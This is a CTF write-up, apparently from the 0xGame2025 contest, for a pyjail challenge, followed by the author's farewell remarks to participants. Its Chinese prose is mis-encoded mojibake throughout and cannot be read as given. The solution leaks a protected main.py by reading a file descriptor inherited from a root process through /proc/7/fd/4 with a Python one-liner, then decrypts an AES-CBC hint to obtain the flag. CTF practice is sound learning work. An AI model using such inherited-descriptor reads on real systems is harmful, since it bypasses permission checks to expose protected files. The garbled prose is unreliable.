æ³¨æ„çœ‹ï¼Œè¿™é‡Œç”±äºé…ç½®ä¸å½“ï¼Œè®© nobodyfork äº† main.pyï¼Œè¿™é‡Œè€ƒå¯Ÿçš„çŸ¥è¯†ç‚¹æ˜¯é€šè¿‡æ–‡ä»¶æè¿°ç¬¦ fdï¼Œè¯»å–å¯¹åº”çš„æ–‡ä»¶

ç›¸å…³åŸç†æ¨è[è¿™ç¯‡æ–‡ç« ](https://www.anquanke.com/post/id/241148)

> moectf ä¸Šé¢ï¼Œjail3 çš„å‡ºé¢˜å¸ˆå‚…ä¸ºäº†å®ç°è¿‡éªŒè¯å’Œä¿æŠ¤ main.pyï¼Œå°†è¿™ä¸ª py è¿›ç¨‹ç»™ fork ä¼ é€’åˆ°å…¶ä»–åœ°æ–¹äº†ï¼Œä½†æ˜¯ä»–é‚£è¾¹å¤±è¯¯äº†ä¸€ç‚¹ï¼Œå°±æ˜¯ä»–è®©çˆ¶è¿›ç¨‹ä½¿ç”¨äº† `pass_fds=[self_fd]`ï¼Œå¯¼è‡´ä½æƒé™çš„å­è¿›ç¨‹**ç»§æ‰¿**äº† FD 4 è¿™ä¸ª**å·²æ‰“å¼€çš„æ–‡ä»¶å¥æŸ„**ã€‚å¦‚æœè¯´ä»–åŠ äº†ä¸ªä¸­é—´è„šæœ¬ï¼Œå°±æ˜¯è¯´ fork çš„å†…å®¹æ˜¯æ‰§è¡Œä¸€ä¸ªè„šæœ¬ï¼Œè¿™ä¸ªè„šæœ¬å†æ‰§è¡Œ main.pyï¼Œæœ‰ç‚¹éš¾åº¦ï¼Œä½†æ˜¯æˆ‘ä¹Ÿæœ‰æ³•å­è§£å†³ï¼Œé‚£å°±æ˜¯ç”¨`os.write()`è¦†ç›– fd çš„æ–‡ä»¶å†…å®¹ï¼Œæ€»ä¹‹æˆ‘ç›®å‰çš„è§£å†³æ–¹æ¡ˆæ˜¯å–æ¶ˆçˆ¶è¿›ç¨‹ forkï¼Œä¸è¿‡è¿™æ ·çš„è¯ï¼Œå°±æ²¡è€ƒå¯Ÿçš„æ„ä¹‰äº†å‘¢ï¼Œæœ‰ç‚¹ç‚¹å°ä¸ºéš¾â€¦â€¦æœ‰äº†ï¼Œé‚£é‡Œçš„`os.memfd_create()`æ”¹æˆ`os.pipe()`,è¿™æ ·çš„ fd æè¿°ç¬¦ä»…ä»…å¯è¯»ï¼Œç„¶åå‘¢ï¼Œæˆ‘å†æŒ‚ä¸ªä¸­é—´æ–‡ä»¶ï¼Œå®Œç¾ï¼

ç„¶åæ€ä¹ˆè¯»å–å‘¢ï¼Ÿè¿™é‡Œ fork çš„æƒé™ç»™äº†æˆ‘ä»¬ nobodyï¼Œä½†æ˜¯ç›´æ¥è¯»çš„è¯ï¼Œä¼šç”±äºé“¾æ¥æ–‡ä»¶ç›´æ¥è¯»å–é‚£ä¸ª/app/main.py äº†

è¯·æ³¨æ„ï¼Œè¿™é‡Œæˆ‘ä»¬ fork æ˜¯ä» root ç”¨æˆ·æ‰§è¡Œæ–‡ä»¶å fork çš„ï¼Œæ¢è¨€ä¹‹ï¼Œroot å·²ç»å¸®æˆ‘ä»¬æ‰“å¼€ï¼Œå¹¶æ‰§è¡Œäº†ç¨‹åºï¼Œæˆ‘ä»¬å°±å®Œå…¨å¯ä»¥æ¥ç€ read äº†ï¼Œç„¶å read çš„æ–‡ä»¶åº”è¯¥æ˜¯`/proc/7/fd/4`!!!

> ä¸€äº›è¡¥å……ï¼Œåœ¨ Linux ä¸­ï¼Œå¯¹æŸäº›æ–‡ä»¶è¿›è¡Œæ“ä½œéƒ½æ˜¯å…ˆ open ç„¶å read,æ¯”æ–¹è¯´ Linux çš„ cat å°±æ˜¯å…ˆ open æ–‡ä»¶ï¼Œå†è¾“å‡ºçš„ï¼Œè¿™é‡Œçš„ open è¿‡ç¨‹å°±æ˜¯æ£€æŸ¥æƒé™çš„ä¸€ä¸ªè¿‡ç¨‹\
> æˆ‘è§‰å¾—æˆ‘è¿™é‡Œçš„ä¸¾ä¾‹å¾ˆå¥½\
> ä¸€ä¸ªæ–‡ä»¶çš„æ“ä½œåˆ†ä¸ºæ‰“å¼€ï¼Œè¯»å–ï¼Œæ“ä½œï¼Œå…³é—­ï¼Œå°±æ¯”æ–¹è¯´ä¸€ä¸ªè¢‹å­ç”¨ root å…ˆæ‰“å¼€ï¼Œç„¶ååœ¨æ‰“å¼€çš„çŠ¶æ€ä¸‹ç»™ nobodyï¼Œæ¥ä¸‹æ¥ nobody å°±ç»•è¿‡äº†æ‰“å¼€çš„æ“ä½œï¼Œè¿™é‡Œçš„æ‰“å¼€æ“ä½œå°±æ˜¯é‚£ä¸ªæ£€æŸ¥æƒé™çš„è¿‡ç¨‹

ç„¶ååœ¨æœ¬ç¯å¢ƒä¸­ï¼Œæ¨èç”¨ python çš„å°è£…è¯­å¥

```bash
python -c "import os;os.lseek(4,0,0);print(os.read(4,90000).decode('latin1',errors='ignore'))"
```

#### ç®€å•è§£é‡Š

* `import os`**ï¼š** å¯¼å…¥ `os` æ¨¡å—ï¼Œä»¥ä¾¿ä½¿ç”¨åº•å±‚æ–‡ä»¶æ“ä½œå‡½æ•°ã€‚

* `os.lseek(4, 0, 0)`**ï¼š** å°† FD 4 çš„è¯»å–æŒ‡é’ˆ**é‡ç½®**åˆ°æ–‡ä»¶çš„å¼€å¤´ï¼ˆåç§»é‡ 0ï¼Œä»æ–‡ä»¶å¼€å¤´å¼€å§‹ï¼‰ã€‚è¿™æ˜¯å¿…è¦çš„ï¼Œå› ä¸ºå­è¿›ç¨‹åœ¨æ‰§è¡Œ Python è„šæœ¬æ—¶ï¼Œè¯»å–æŒ‡é’ˆå¾ˆå¯èƒ½å·²ç»ç§»åˆ°äº†æ–‡ä»¶æœ«å°¾ã€‚

* `os.read(4, 90000)`**ï¼š** ä»æ–‡ä»¶æè¿°ç¬¦ 4 ä¸­è¯»å–æœ€å¤š 90000 å­—èŠ‚çš„æ•°æ®ã€‚(90000 æˆ‘éšä¾¿å†™çš„ï¼Œè‚¯å®šè¶Šå¤šè¶Šèƒ½ä¿è¯æå–å®Œæ•´å•Š)

* `.decode(...)`**ï¼š** å°†è¯»å–åˆ°çš„å­—èŠ‚æµè§£ç ä¸ºå­—ç¬¦ä¸²å¹¶æ‰“å°å‡ºæ¥ã€‚

#### get flag

æ‰§è¡Œåè¯»å–åˆ°äº† main.pyï¼Œæ‹¿åˆ°äº† flag_hint å‡½æ•°ï¼Œ

```python
def flag_hint():
    print("there are some important information for you")
    key='49a635cd124174a4b3e0d4c02b6224ddfaabc5e2640600cc195e29f21075dd93'
    IV='MEOHeAiC+BlLhH3FKhl0MQ=='
    Ciphertext='j+W4sfLJL4wN0rX2Qi03wqDXDb37DNtYjeYoBVIeKOt4WSUb/Sx4B8/8O4ZXA4J9'
    print("that's all,have fun!!!")
```

å¾ˆåŸºç¡€çš„ CBC åŠ å¯† aesï¼Œæˆ‘çœ‹ Sean åœ¨ week2 ç»™ä½ ä»¬å‡ºè¿‡ï¼Œä¸ç®¡æ˜¯å†™è„šæœ¬è¿˜æ˜¯åœ¨çº¿å·¥å…·ï¼Œéƒ½å¾ˆå¥½è§£å†³

```python
import base64
import binascii
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def decrypt_cbc_data(key_hex,iv_b64,ciphertext_b64):
        try:
                key=bytes.fromhex(key_hex)
                iv=base64.b64decode(iv_b64)
                ciphertext=base64.b64decode(ciphertext_b64)

                if len(key) not in [16,24,32]:
                        raise ValueError(f"wrong length:{len(key)}")

                if len(iv) != 16:
                        raise ValueError(f"wrong length:{len(iv)}")

                cipher=AES.new(key,AES.MODE_CBC,iv)
                plaintext=cipher.decrypt(ciphertext)

                plaintext=unpad(plaintext,AES.block_size)
                return plaintext.decode('utf-8')

        except Exception as e:
                raise Exception(f"worng:{str(e)}")

key='49a635cd124174a4b3e0d4c02b6224ddfaabc5e2640600cc195e29f21075dd93'
IV='MEOHeAiC+BlLhH3FKhl0MQ=='
Ciphertext='j+W4sfLJL4wN0rX2Qi03wqDXDb37DNtYjeYoBVIeKOt4WSUb/Sx4B8/8O4ZXA4J9'


try:
        result=decrypt_cbc_data(key,IV,Ciphertext)
        print("sussessful!!!")
        print("result:",result)
except Exception as e:
        print("wrong:",str(e))
     
"""
sussessful!!!
result: 0xGame{Contratulations!You_solved_pyjail!}
"""
```

### å¤§è€Œç¾

> è¿™ä¸ªäººå‡ºçš„é¢˜ï¼Œæˆ‘ä¸å¤ªæƒ³è®²ï¼Œéœ€è¦çš„é—®ä»–

***

### To be continues

Okey,çœ‹åˆ°è¿™é‡Œï¼Œä¹Ÿå°±æ„å‘³ç€æ•´ä¸ª 0xGame2025 ç»“æŸå’¯ï¼Œç»“åˆæˆ‘ç»™å‡ºçš„æˆè¯¾ pdfï¼Œå¤§å®¶åº”è¯¥æ”¶è·äº†ä¸å°‘å§ï¼Œä¸‹é¢æ˜¯ä¸€äº›ç»“æŸè¯­â€¦â€¦

to è€èµ›æ£ï¼š

â€‹ è¿™æ˜¯æˆ‘ç¬¬ä¸€æ¬¡å‡ºé¢˜ï¼Œéš¾åº¦ä¸Šç¡®å®æ²¡æŠŠæ¡ä½ï¼Œéš¾äº†ä¸å°‘å§ï¼ˆå·²ç»ç®€åŒ–äº†å‘¢ï¼Œè€Œä¸”è€ƒå¯Ÿæ¯”è¾ƒåå‘åŸç†ã€å®æˆ˜ï¼‰

â€‹ æ˜¯ä¸æ˜¯å¯¹ä½ ä»¬æ¥è¯´ï¼Œè¿™æ¬¡ misc æ¯”è¾ƒé™Œç”Ÿï¼Ÿå› ä¸ºä»¥å¾€çš„äº”èŠ±å…«é—¨çš„éšå†™ï¼Œæˆ‘ä¸å¤ªå–œæ¬¢ï¼Œæœ‰äº›è¦å¯¹å‡ºé¢˜äººè„‘æ´ï¼Œæœ‰äº›æŒ‡å®šäº†æŸäº›å¦™å¦™å°å·¥å…·ï¼Œè‡³å°‘åœ¨æˆ‘çœ‹æ¥ï¼Œè¿™ç§é¢˜å°±ç®—è§£å†³äº†ï¼Œæˆå°±æ„Ÿä¹Ÿä¸æ˜¯å¾ˆé«˜ï¼Œå“ˆå“ˆï¼Œå¹¶æ²¡æœ‰å¦å®šå…¶ä»–å‡ºé¢˜å¸ˆå‚…çš„æ„æ€ï¼Œæ¯ä¸ªäººéƒ½æœ‰è‡ªå·±çš„å‡ºé¢˜é£æ ¼å§ï¼Œä½†æ˜¯å¤§å®¶çš„ç›®æ ‡éƒ½ä¸€æ ·ï¼Œé€šè¿‡ä¸€æ¬¡åˆä¸€æ¬¡æ¯”èµ›ï¼Œå­¦ä¹ æ–°çš„æŠ€èƒ½ï¼Œä¸ºå­¦å¼Ÿå­¦å¦¹ä»¬æ›´è½»æ¾å…¥é—¨ ctf æä¾›å¸®åŠ©ã€‚åœ¨åç»­çš„æ¯”èµ›ä¸­ï¼Œæ„¿å’Œå¤§å®¶å…±å‹‰ï¼Œå¤§å®¶éƒ½æ˜¯å­¦ä¹ å®‰å…¨çš„ï¼Œåœ¨è¿½æ±‚æ›´é«˜æ›´æ–°çš„æŠ€æœ¯çš„è·¯ä¸Šï¼Œæˆ‘ä»¬æ˜¯å¯¹æ‰‹ä¹Ÿæ˜¯åŒè·¯äººï¼Œé¡¶å³°è§ï¼

***

to å­¦å¼Ÿå­¦å¦¹ä»¬ï¼ˆæ ¡å†…å¤–éƒ½ç®—å“¦ï¼‰ï¼š

â€‹ æœ¬æ¬¡æ–°ç”Ÿèµ›ç»“æŸäº†ï¼Œå¤§å®¶æœ‰æ²¡æœ‰ä½“ä¼šåˆ°ä»€ä¹ˆæ˜¯ç½‘ç»œå®‰å…¨å‘¢ï¼Ÿæœ‰æ²¡æœ‰ä½“éªŒåˆ°è‡ªå·±æƒ³è±¡ä¸­çš„ hacker ç”Ÿæ´»å‘¢ï¼Ÿå“ˆå“ˆï¼Œæ˜¯ä¸æ˜¯æ„Ÿè§‰è¢«éª—äº†ï¼ˆæˆ‘å½“åˆä¹Ÿæ˜¯è¿™æ ·æƒ³çš„ï¼‰ä½†æ˜¯ï¼ï¼ï¼è¿™æ‰æ˜¯çœŸæ­£é»‘å®¢è¦ç»å†çš„é“è·¯ï¼Œç½‘ä¸Šçš„é‚£ç§æˆ´é¢å…·çš„é»‘å®¢æ‰å¤§éª—å­å‘¢ï¼Œè¶…çº§åœˆé’±å¤§éª—å­

â€‹ å¦‚æœä½ ä»¬è®¤çœŸä» week1 æ‰“åˆ°äº† week4ï¼Œæˆ‘å¯ä»¥è´Ÿè´£ä»»çš„è¯´ï¼Œä½ ä»¬éƒ½å·²ç»å…¥é—¨ ctf æ¯”èµ›ï¼ˆæˆ‘ä»¬ä»Šå¹´ 0x çœŸçš„è›®æœ‰éš¾åº¦çš„ï¼Œæ‰€ä»¥é‚£äº›æ„Ÿè§‰åˆ†æ•°è¾ƒä½çš„å­¦å¼Ÿå­¦å¦¹ä¸è¦æ°”é¦ï¼Œèƒ½åšæŒä¸‹æ¥ï¼Œä½ ä»¬å·²ç»ç”©äº†åŒå±ŠåŒå­¦ä¸€å¤§åœˆäº†ï¼ˆåŒ…æ‹¬å°‘æ•°è€ç™»å‘¢ï¼Œæˆ‘å»å¹´çœŸçš„å¾ˆèœå¾ˆèœ

â€‹ åœ¨ä½ ä»¬åé¢çš„å­¦ä¹ ç”Ÿæ´»ä¸­ï¼Œå¸Œæœ›ä½ ä»¬è„šè¸å®åœ°ï¼Œé‡åˆ°ä¸€ä¸ªçŸ¥è¯†ç‚¹ï¼ŒæŠ½ç‚¹æ—¶é—´é’»ç ”ä¸€äºŒï¼Œé‚£ç§å·¥å…·é¢˜çš„è¯ï¼Œå¯ä»¥ç®€å•çœ‹çœ‹ wpï¼Œäº†è§£ä¸‹å°± ok äº†ï¼Œå¯¹äº†ï¼Œç»™ä½ ä»¬æ¨èä¸€ç¯‡[æ–‡ç« ](https://goodlunatic.github.io/posts/1ad9200/)ï¼Œåšå®¢ä½œè€…æ˜¯ Lunaticï¼Œæˆ‘å½“åˆæ˜¯çœ‹ä»–çš„è§†é¢‘ä¸€æ­¥ä¸€æ­¥å­¦ä¹ çš„ï¼Œä»–çœŸçš„å¥½å‰å®³ï¼Œè¿™ç¯‡æ–‡ç« æ˜¯ä»–ä¸º misc å…¥é—¨çš„æ–°æ‰‹ä»¬å†™çš„ï¼Œä½ ä»¬è§£é¢˜é‡åˆ°äº†æ²¡è§è¿‡çš„è€ƒç‚¹ï¼Œå¯ä»¥å‚è€ƒä»–çš„æ–‡ç« 

â€‹ å­¦ä¹ å®‰å…¨æ˜¯æœ‰ä¸ªâ€œæ·å¾„â€çš„ï¼Œé‚£å°±æ˜¯ä¸æ–­çš„å‚åŠ  ctf æ¯”èµ›ï¼Œä»¥èµ›ä»£å­¦ï¼Œåœ¨è¿™ä¸ªè·¯ç¨‹ä¸­ï¼Œå‡ ä¹ä¸ä¼šè½»æ¾ï¼Œæœ‰æ—¶å€™ä¸€ä¸ªçŸ¥è¯†ç‚¹éš¾ä½ä½ ä¸€å‘¨ä¹Ÿæ˜¯æœ‰å¯èƒ½çš„ï¼Œä½†æ˜¯è§£å†³åæ”¶è·çš„å–œæ‚¦ä¹Ÿæ˜¯æœ€é«˜çš„ï¼Œç„¶ååœ¨è·¯ä¸Šï¼Œä½ ä¼šé‡åˆ°æ›´å¤šæŠ€æœ¯ä½¬ï¼Œäº¤æµæ›´æ·±å…¥æ›´å¤šçš„æŠ€æœ¯ï¼Œä½†æ˜¯ä¸€ä¸ªäººèµ°ï¼ŒæŒºéš¾ï¼Œæ‰€ä»¥å»ºè®®ä½ ä»¬èƒ½æ‰¾ä¸ªæ­å­ï¼Œå»ºè®®åŒæ ¡ä¼˜å…ˆï¼Œæ–¹ä¾¿ä¸€èµ·æ‰“æ‰“æ¯”èµ›ï¼Œäº’ç›¸æ”¯æŒï¼Œèµ°å‘æ›´è¿œ

â€‹ å…³äº AI ä½¿ç”¨ï¼Œä¸€å®šè¦`åˆç†ä½¿ç”¨`ï¼Œæˆ‘çœ‹äº†ä¸å°‘äº¤ä¸Šæ¥çš„ wpï¼Œå¤§éƒ¨åˆ†æ˜¯å°† ai ç»™å‡ºçš„ç»“è®ºæ”¾åˆ° wp é‡Œé¢äº†ï¼Œæ›´æœ‰ç”šè€…ï¼Œç›´æ¥è®© AI ç»™ä»–å†™ wp,æˆ‘è¯»å®Œï¼Œæ„Ÿè§‰å¾ˆæŠ½è±¡ï¼Œæ²¡æœ‰ä¸€ç‚¹ç‚¹â€œæ´»äººæ°”æ¯â€ï¼Œç†è§£æˆ‘çš„æ„æ€å§ï¼Œæˆ‘æ›´å¸Œæœ›å¤§å®¶åé¢å­¦ä¹ ï¼Œå†™ wp çš„æ—¶å€™è¦å†™å†™è‡ªå·±çš„æ€è€ƒè¿‡ç¨‹ï¼Œè¿™å¯¹å‡ºé¢˜äººå’Œè‡ªå·±éƒ½æœ‰å¥½å¤„ï¼ˆå‡†ç¡®æ¥è¯´ï¼Œwp æ˜¯ç»™ä½ è‡ªå·±å†™çš„ï¼Œæ¯•ç«Ÿæ˜¯ä½ çš„æ¥æ—¶è·¯ï¼Œè¿˜è¯·é‡è§†ä¸‹ï¼Œä¸ç®¡æ˜¯æ±‚èŒè¿˜æ˜¯ç”³è¯·è¿›å…¥è”åˆæˆ˜é˜Ÿï¼Œä¸€ä¸ªä¼˜è´¨çš„åšå®¢æŠ€æœ¯æ ˆä¸€å®šæ˜¯é¢è¯•ä¸­çš„åŠ åˆ†é¡¹